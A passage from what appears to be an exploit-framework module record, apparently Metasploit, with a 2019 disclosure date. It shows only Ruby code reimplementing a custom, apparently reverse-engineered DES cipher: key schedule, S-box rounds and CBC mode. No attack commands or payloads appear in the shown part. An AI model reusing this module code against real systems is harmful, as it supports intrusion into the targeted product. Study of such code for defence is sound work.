input_block_tuple[0]\n    v4 = input_block_tuple[1]\n\n    if (v4 & 0x80) != 0\n      v5 = 1\n    end\n    if (v3 & 0x80) != 0\n      v5 |= 2\n    end\n    if (v4 & 0x8000) != 0\n      v5 |= 4\n    end\n    if (v3 & 0x8000) != 0\n      v5 |= 8\n    end\n    if (v4 & 0x800000) != 0\n      v5 |= 0x10\n    end\n    if (v3 & 0x800000) != 0\n      v5 |= 0x20\n    end\n    if (v4 < 0)\n      v5 |= 0x40\n    end\n    if (v3 < 0)\n      v5 |= 0x80\n    end\n    if (v4 & 0x40) != 0\n      v5 |= 0x100\n    end\n    if (v3 & 0x40) != 0\n      v5 |= 0x200\n    end\n    if (v4 & 0x4000) != 0\n      v5 |= 0x400\n    end\n    if (v3 & 0x4000) != 0\n      v5 |= 0x800\n    end\n    if (v4 & 0x400000) != 0\n      v5 |= 0x1000\n    end\n    if (v3 & 0x400000) != 0\n      v5 |= 0x2000\n    end\n    if (v4 & 0x40000000) != 0\n      v5 |= 0x4000\n    end\n    if (v3 & 0x40000000) != 0\n      v5 |= 0x8000\n    end\n    if (v4 & 0x20) != 0\n      v5 |= 0x10000\n    end\n    if (v3 & 0x20) != 0\n      v5 |= 0x20000\n    end\n    if (v4 & 0x2000) != 0\n      v5 |= 0x40000\n    end\n    if (v3 & 0x2000) != 0\n      v5 |= 0x80000\n    end\n    if (v4 & 0x200000) != 0\n      v5 |= 0x100000\n    end\n    if (v3 & 0x200000) != 0\n      v5 |= 0x200000\n    end\n    if (v4 & 0x20000000) != 0\n      v5 |= 0x400000\n    end\n    if (v3 & 0x20000000) != 0\n      v5 |= 0x800000\n    end\n    if (v4 & 0x10) != 0\n      v5 |= 0x1000000\n    end\n    if (v3 & 0x10) != 0\n      v5 |= 0x2000000\n    end\n    if (v4 & 0x1000) != 0\n      v5 |= 0x4000000\n    end\n    if (v3 & 0x1000) != 0\n      v5 |= 0x8000000\n    end\n    if (v4 & 0x100000) != 0\n      v5 |= 0x10000000\n    end\n    if (v3 & 0x100000) != 0\n      v5 |= 0x20000000\n    end\n    if (v4 & 0x10000000) != 0\n      v5 |= 0x40000000\n    end\n    if (v3 & 0x10000000) != 0\n      v5 |= 0x80000000\n    end\n    if (v4 & 8) != 0\n      v6 = 1\n    end\n    if (v3 & 8) != 0\n      v6 |= 2\n    end\n    if (v4 & 0x800) != 0\n      v6 |= 4\n    end\n    if (v3 & 0x800) != 0\n      v6 |= 8\n    end\n    if (v4 & 0x80000) != 0\n      v6 |= 0x10\n    end\n    if (v3 & 0x80000) != 0\n      v6 |= 0x20\n    end\n    if (v4 & 0x8000000) != 0\n      v6 |= 0x40\n    end\n    if (v3 & 0x8000000) != 0\n      v6 |= 0x80\n    end\n    if (v4 & 4) != 0\n      v6 |= 0x100\n    end\n    if (v3 & 4) != 0\n      v6 |= 0x200\n    end\n    if (v4 & 0x400) != 0\n      v6 |= 0x400\n    end\n    if (v3 & 0x400) != 0\n      v6 |= 0x800\n    end\n    if (v4 & 0x40000) != 0\n      v6 |= 0x1000\n    end\n    if (v3 & 0x40000) != 0\n      v6 |= 0x2000\n    end\n    if (v4 & 0x4000000) != 0\n      v6 |= 0x4000\n    end\n    if (v3 & 0x4000000) != 0\n      v6 |= 0x8000\n    end\n    if (v4 & 2) != 0\n      v6 |= 0x10000\n    end\n    if (v3 & 2) != 0\n      v6 |= 0x20000\n    end\n    if (v4 & 0x200) != 0\n      v6 |= 0x40000\n    end\n    if (v3 & 0x200) != 0\n      v6 |= 0x80000\n    end\n    if (v4 & 0x20000) != 0\n      v6 |= 0x100000\n    end\n    if (v3 & 0x20000) != 0\n      v6 |= 0x200000\n    end\n    if (v4 & 0x2000000) != 0\n      v6 |= 0x400000\n    end\n    if (v3 & 0x2000000) != 0\n      v6 |= 0x800000\n    end\n    if (v4 & 1) != 0\n      v6 |= 0x1000000\n    end\n    if (v3 & 1) != 0\n      v6 |= 0x2000000\n    end\n    if (v4 & 0x100) != 0\n      v6 |= 0x4000000\n    end\n    if (v3 & 0x100) != 0\n      v6 |= 0x8000000\n    end\n    if (v4 & 0x10000) != 0\n      v6 |= 0x10000000\n    end\n    if (v3 & 0x10000) != 0\n      v6 |= 0x20000000\n    end\n    if (v4 & 0x1000000) != 0\n      v6 |= 0x40000000\n    end\n    if (v3 & 0x1000000) != 0\n      v6 |= 0x80000000\n    end\n\n    # Create return tuple\n    ret_block = Array.new\n    ret_block.push v5\n    ret_block.push v6\n    ret_block\n  end\n\n  def load(a1)\n    a2 = Array.new(8, 0)\n    v3 = a1\n    a2[0] = a1 & 0xff\n    v3 >>= 3\n    a2[1] = v3 & 0xff\n    v3 >>= 4\n    a2[2] = v3 & 0xff\n    v3 >>= 4\n    a2[3] = v3 & 0xff\n    v3 >>= 4\n    a2[4] = v3 & 0xff\n    v3 >>= 4\n    a2[5] = v3 & 0xff\n    v3 >>= 4\n    a2[6] = v3 & 0xff\n    v3 >>= 4\n    a2[7] = v3 & 0xff\n    a2[0] = (a2[0] * 2) & 0xff\n    a2[7] |= (16 * a2[0]) & 0xff\n    v3 >>= 4\n    a2[0] |= v3 & 0xff\n\n    data_block = a2.pack(\"c*\").unpack(\"V*\")\n    data_block[0] &= 0x3F3F3F3F\n    data_block[1] &= 0x3F3F3F3F\n    data_block\n  end\n\n  def desx(data_block, ksch, idx)\n    ksch = ksch.pack(\"V*\")\n    ksch = ksch.unpack(\"Q<*\")\n    key_block = ksch[idx]\n\n    data_block_ptr = data_block.pack(\"V*\")\n    data_block_ptr = data_block_ptr.unpack1(\"Q<*\")\n    data_block_ptr ^= key_block\n\n    counter = 1\n    data_block_byte_ptr = [data_block_ptr].pack('Q<')\n    left = SBOXES[data_block_byte_ptr[0].ord]\n    right = SBOXES[data_block_byte_ptr[0].ord + (counter << 6)]\n    counter += 1\n    left ^= SBOXES[data_block_byte_ptr[1].ord + (counter << 6)]\n    counter += 1\n    right ^= SBOXES[data_block_byte_ptr[1].ord + (counter << 6)]\n    counter += 1\n    left ^= SBOXES[data_block_byte_ptr[2].ord + (counter << 6)]\n    counter += 1\n    right ^= SBOXES[data_block_byte_ptr[2].ord + (counter << 6)]\n    counter += 1\n    left ^= SBOXES[data_block_byte_ptr[3].ord + (counter << 6)]\n    counter += 1\n    right ^= SBOXES[data_block_byte_ptr[3].ord + (counter << 6)]\n    counter += 1\n    left ^= SBOXES[data_block_byte_ptr[4].ord + (counter << 6)]\n    counter += 1\n    right ^= SBOXES[data_block_byte_ptr[4].ord + (counter << 6)]\n    counter += 1\n    left ^= SBOXES[data_block_byte_ptr[5].ord + (counter << 6)]\n    counter += 1\n    right ^= SBOXES[data_block_byte_ptr[5].ord + (counter << 6)]\n    counter += 1\n    left ^= SBOXES[data_block_byte_ptr[6].ord + (counter << 6)]\n    counter += 1\n    right ^= SBOXES[data_block_byte_ptr[6].ord + (counter << 6)]\n    counter += 1\n    left ^= SBOXES[data_block_byte_ptr[7].ord + (counter << 6)]\n    counter += 1\n    right ^= SBOXES[data_block_byte_ptr[7].ord + (counter << 6)]\n\n    # Create return tuple\n    ret_block = Array.new\n    ret_block.push left\n    ret_block.push right\n    ret_block\n\n  end\n\n  def store(data_block)\n    a1 = data_block.pack(\"V*\")\n    val = 8 * (16 * (16 * (16 * (16 * (16 * (16 * a1[7].ord | a1[6].ord) | a1[5].ord) | a1[4].ord) | a1[3].ord) | a1[2].ord) | a1[1].ord) | a1[0].ord >> 1\n    val & 0xffffffff\n  end\n\n  def sbox_xors(data_block_in, ksch_arg, decrypt_flag)\n\n    decrypt_flag_cpy = decrypt_flag\n    if (decrypt_flag & 0x100) != 0\n      data_block_0 = data_block_in\n    else\n      data_block_0 = rotate_block_init(data_block_in)\n    end\n\n    encrypt_flag = (decrypt_flag_cpy & 1) == 0\n    ti_block_0 = load(data_block_0[0])\n    ti_block_1 = load(data_block_0[1])\n\n    for i in 0..15\n      ti_cpy = ti_block_1\n      if encrypt_flag\n        ti_block_1 = desx(ti_block_1, ksch_arg, i)\n      else\n        ti_block_1 = desx(ti_block_1, ksch_arg, 15 - i)\n      end\n      ti_block_1[0] ^= ti_block_0[0]\n      ti_block_1[1] ^= ti_block_0[1]\n      ti_block_0 = ti_cpy\n    end\n\n    data_block_0[0] = store(ti_block_1)\n    data_block_0[1] = store(ti_block_0)\n\n    if (!(decrypt_flag_cpy & 0x200) != 0)\n      rotate_block_final(data_block_0)\n    else\n      data_block_0\n    end\n\n  end\n\n  def gen_key_unchecked(key)\n\n    idx = 0\n    key_arr = key.unpack(\"V*\")\n    key_sch = Array.new\n    for i in 0..15\n      idx += ROTATIONS[i].ord\n      v6 = 0\n      v5 = 0\n      v14 = 0\n      for j in 0..47\n        pc2_p1 = (idx + PC2[j].ord) % 0x1C\n        if PC2[j].ord > 0x1B\n          pc2_p2 = 0x1c\n        else\n          pc2_p2 = 0\n        end\n        v13 = PC1[pc2_p1 + pc2_p2].ord\n        if v13 <= 31\n          v12 = 0\n        else\n          v12 = 1\n          v13 -= 32\n        end\n        if j <= 23\n          v10 = j\n        else\n          v14 = 1\n          v10 = j - 24\n        end\n        v11 = 8 * (v10 / 6) + v10 % 6\n        key_and = key_arr[v12] & SBOX_BYTE_ORDER[v13]\n\n        if (key_and != 0)\n          if v14 == 1\n            v6 |= SBOX_BYTE_ORDER[v11]\n          else\n            v5 |= SBOX_BYTE_ORDER[v11]\n          end\n        end\n      end\n      key_sch.push v5\n      key_sch.push v6\n    end\n    key_sch\n  end\n\n  def des_string_to_key(key_buf_str)\n\n    des_keysch_0 = gen_key_unchecked(INIT_DES_KEY_0)\n    des_keysch_1 = gen_key_unchecked(INIT_DES_KEY_1)\n\n    temp_key1 = Array.new(8, 0)\n    temp_key2 = Array.new(8, 0)\n\n    key_buf_bytes = key_buf_str.unpack(\"c*\")\n\n    counter = 0\n    key_buf_str_len = key_buf_bytes.length - 1\n    for i in 0..key_buf_str_len\n      counter %= 8\n      temp_key1[counter] |= key_buf_bytes[i]\n      temp_key2[counter] |= key_buf_bytes[i]\n\n      data_block = temp_key1.pack(\"c*\").unpack(\"V*\")\n      temp_key1 = sbox_xors(data_block, des_keysch_0, 0)\n      temp_key1 = temp_key1.pack(\"V*\").unpack(\"c*\")\n\n      data_block = temp_key2.pack(\"c*\").unpack(\"V*\")\n      temp_key2 = sbox_xors(data_block, des_keysch_1, 0)\n      temp_key2 = temp_key2.pack(\"V*\").unpack(\"c*\")\n      counter += 1\n    end\n\n    # Prepare the return array\n    ret_key = Array.new(8, 0)\n    for j in 0..7\n      ret_key[j] = temp_key2[j] ^ temp_key1[j]\n    end\n    ret_key.pack(\"c*\")\n  end\n\n  def des_cbc(input_buf, key_sch, iv, decrypt_flag)\n\n    output_block_arr = Array.new\n    blocks = input_buf.unpack(\"Q<*\")\n    for i in 0..blocks.length - 1\n\n      current_block = blocks[i]\n      if decrypt_flag == 1\n        cur_block = current_block\n      else\n        current_block ^= iv\n      end\n\n      current_block_tuple = [current_block].pack(\"Q<\").unpack(\"V*\")\n      output_block_tuple = sbox_xors(current_block_tuple, key_sch, decrypt_flag)\n      output_block = output_block_tuple.pack(\"V*\").unpack1(\"Q<\")\n      output_block_arr.push output_block\n\n      if decrypt_flag == 1\n        output_block ^= iv\n        iv = cur_block\n      else\n        iv = output_block\n      end\n    end\n\n    output_block_arr.pack(\"Q<*\")\n\n  end\n\n  def des_crypt_func(binary_buf, key_buf, decrypt_flag)\n    des_key = des_string_to_key(key_buf)\n    des_keysch = gen_key_unchecked(des_key)\n\n    temp_enc_buf = Array.new(8 * ((binary_buf.length + 7) >> 3) + 8, 0)\n    binary_buf_str = binary_buf.unpack('c*')\n\n    for j in 0..binary_buf_str.length - 1\n      temp_enc_buf[j] = binary_buf_str[j]\n    end\n\n    temp_enc_buf = temp_enc_buf.pack('c*')\n    output_buf = des_cbc(temp_enc_buf, des_keysch, 0, decrypt_flag)\n    output_buf\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-01-17",
    "x_mitre_platforms": [
        "%w[linux unix win]"
    ]
}